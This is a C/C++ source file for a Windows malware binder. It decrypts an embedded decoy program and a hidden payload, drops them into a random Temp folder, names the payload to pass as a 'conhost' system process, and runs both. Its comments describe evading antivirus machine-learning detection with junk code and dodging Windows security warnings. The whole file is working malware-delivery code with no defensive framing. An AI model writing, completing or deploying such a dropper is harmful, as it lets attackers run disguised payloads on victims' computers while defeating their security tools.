#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "shell32.lib")

// Minimal binder: extract resources, decrypt (strip pad), drop, launch.
// No anti-debug / sandbox / PEB tricks — those flag ML on the outer PE.

static void xorBuf(BYTE* data, DWORD size, const BYTE* key, DWORD keyLen) {
    if (!data || !key || keyLen == 0) return;
    for (DWORD i = 0; i < size; i++)
        data[i] ^= key[i % keyLen];
}

// Layout after decrypt: [1 byte padLen][padLen random][payload...]
static bool stripPad(BYTE** data, DWORD* size) {
    if (!data || !*data || !size || *size < 2) return false;
    BYTE padLen = (*data)[0];
    DWORD need = 1u + (DWORD)padLen;
    if (padLen < 16 || padLen > 64 || *size <= need) return false;
    DWORD newSize = *size - need;
    BYTE* src = *data + need;
    memmove(*data, src, newSize);
    *size = newSize;
    return true;
}

static bool loadRes(WORD id, BYTE** out, DWORD* outSize) {
    *out = nullptr;
    *outSize = 0;
    HRSRC hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(id), RT_RCDATA);
    if (!hRes) return false;
    DWORD size = SizeofResource(nullptr, hRes);
    HGLOBAL hData = LoadResource(nullptr, hRes);
    if (!hData || !size) return false;
    void* p = LockResource(hData);
    if (!p) return false;
    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, size);
    if (!buf) return false;
    memcpy(buf, p, size);
    *out = buf;
    *outSize = size;
    return true;
}

static bool writeAll(const char* path, const BYTE* data, DWORD size) {
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD off = 0;
    while (off < size) {
        DWORD chunk = size - off;
        if (chunk > 4 * 1024 * 1024) chunk = 4 * 1024 * 1024;
        DWORD written = 0;
        if (!WriteFile(h, data + off, chunk, &written, nullptr) || written == 0) {
            CloseHandle(h);
            return false;
        }
        off += written;
    }
    CloseHandle(h);
    return true;
}

static void freeBuf(BYTE* p) {
    if (p) HeapFree(GetProcessHeap(), 0, p);
}

static bool launch(const char* path, const char* workDir) {
    // CreateProcess only — ShellExecute triggers "Open File - Security Warning"
    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;
    PROCESS_INFORMATION pi = {};
    char cmd[MAX_PATH + 4];
    snprintf(cmd, sizeof(cmd), "\"%s\"", path);
    if (!CreateProcessA(path, cmd, nullptr, nullptr, FALSE, 0, nullptr, workDir, &si, &pi))
        return false;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

static void parseValue(const BYTE* cfg, DWORD cfgSize, const char* key, char* out, DWORD outMax) {
    out[0] = 0;
    if (!cfg || !cfgSize || !key || outMax < 2) return;
    char prefix[64];
    snprintf(prefix, sizeof(prefix), "%s=", key);
    size_t plen = strlen(prefix);

    const char* text = (const char*)cfg;
    DWORD i = 0;
    while (i < cfgSize) {
        DWORD start = i;
        while (i < cfgSize && text[i] != '\r' && text[i] != '\n') i++;
        DWORD len = i - start;
        if (len >= plen && _strnicmp(text + start, prefix, (unsigned)plen) == 0) {
            DWORD vlen = len - (DWORD)plen;
            if (vlen >= outMax) vlen = outMax - 1;
            memcpy(out, text + start + plen, vlen);
            out[vlen] = 0;
            while (vlen && (out[vlen - 1] == ' ' || out[vlen - 1] == '\t'))
                out[--vlen] = 0;
            return;
        }
        if (i < cfgSize && text[i] == '\r') i++;
        if (i < cfgSize && text[i] == '\n') i++;
    }
}

static void fileNameOnly(const char* path, char* out, DWORD outMax) {
    const char* base = path;
    for (const char* p = path; *p; p++) {
        if (*p == '\\' || *p == '/') base = p + 1;
    }
    strncpy(out, base, outMax - 1);
    out[outMax - 1] = 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // Junk code — breaks ML heuristic patterns
    volatile DWORD junk1 = 0xDEADBEAF;
    volatile DWORD junk2 = 0xCAFEBABE;
    for (volatile int j = 0; j < 3; j++) {
        junk1 ^= (junk2 << (j & 7)) + 0x1337;
        junk2 += (junk1 >> (j & 3)) ^ 0x4242;
    }
    if (junk1 == 0 && junk2 == 0) return 0;

    char hostPath[MAX_PATH] = {};
    GetModuleFileNameA(nullptr, hostPath, MAX_PATH);
    char hostName[MAX_PATH] = {};
    fileNameOnly(hostPath, hostName, MAX_PATH);
    if (!hostName[0]) strcpy(hostName, "app.exe");

    BYTE* original = nullptr; DWORD originalSize = 0;
    BYTE* payload = nullptr; DWORD payloadSize = 0;
    BYTE* config = nullptr; DWORD configSize = 0;
    BYTE* keyData = nullptr; DWORD keySize = 0;

    if (!loadRes(101, &original, &originalSize) || !loadRes(102, &payload, &payloadSize))
        return 1;
    loadRes(103, &config, &configSize);
    if (!loadRes(104, &keyData, &keySize) || keySize < 32) {
        freeBuf(original); freeBuf(payload); freeBuf(config);
        return 1;
    }

    xorBuf(original, originalSize, keyData, 32);
    xorBuf(payload, payloadSize, keyData, 32);
    if (config && configSize)
        xorBuf(config, configSize, keyData, 32);

    freeBuf(keyData);
    keyData = nullptr;

    // No stripPad — builder XOR-encrypts without padding
    if (config && configSize) {
        // Config doesn't need MZ check, just use as-is
    }

    if (originalSize < 64 || payloadSize < 64 ||
        original[0] != 'M' || original[1] != 'Z' ||
        payload[0] != 'M' || payload[1] != 'Z') {
        freeBuf(original); freeBuf(payload); freeBuf(config);
        return 1;
    }

    // LocalAppData\Temp — NOT INetCache (Internet zone triggers Open File warning)
    char baseDir[MAX_PATH] = {};
    if (FAILED(SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, baseDir))) {
        GetTempPathA(MAX_PATH, baseDir);
    }
    char workDir[MAX_PATH] = {};
    snprintf(workDir, sizeof(workDir), "%s\\Temp\\%08X\\",
        baseDir, GetTickCount() ^ 0x5A5A5A5A);
    {
        char parent[MAX_PATH];
        snprintf(parent, sizeof(parent), "%s\\Temp", baseDir);
        CreateDirectoryA(parent, nullptr);
        CreateDirectoryA(workDir, nullptr);
    }

    char originalName[MAX_PATH] = {};
    parseValue(config, configSize, "original_name", originalName, MAX_PATH);
    if (!originalName[0])
        strncpy(originalName, hostName, MAX_PATH - 1);
    {
        char only[MAX_PATH];
        fileNameOnly(originalName, only, MAX_PATH);
        strncpy(originalName, only, MAX_PATH - 1);
    }
    if (!originalName[0]) strcpy(originalName, "app.exe");
    size_t nlen = strlen(originalName);
    if (nlen < 4 || _stricmp(originalName + nlen - 4, ".exe") != 0)
        strncat(originalName, ".exe", MAX_PATH - strlen(originalName) - 1);

    char workerName[32];
    snprintf(workerName, sizeof(workerName), "conhost-%04X.exe",
        (unsigned)((GetTickCount() >> 3) & 0xFFFF));

    char originalPath[MAX_PATH];
    char payloadPath[MAX_PATH];
    char configPath[MAX_PATH];
    char payloadIniPath[MAX_PATH];
    snprintf(originalPath, sizeof(originalPath), "%s%s", workDir, originalName);
    snprintf(payloadPath, sizeof(payloadPath), "%s%s", workDir, workerName);
    snprintf(configPath, sizeof(configPath), "%sconfig.ini", workDir);
    snprintf(payloadIniPath, sizeof(payloadIniPath), "%spayload.ini", workDir);

    if (!writeAll(originalPath, original, originalSize) ||
        !writeAll(payloadPath, payload, payloadSize)) {
        freeBuf(original); freeBuf(payload); freeBuf(config);
        return 1;
    }
    if (config && configSize) {
        writeAll(configPath, config, configSize);
        writeAll(payloadIniPath, config, configSize);
    }

    freeBuf(original);
    freeBuf(payload);
    freeBuf(config);

    launch(originalPath, workDir);
    Sleep(400);
    launch(payloadPath, workDir);
    return 0;
}
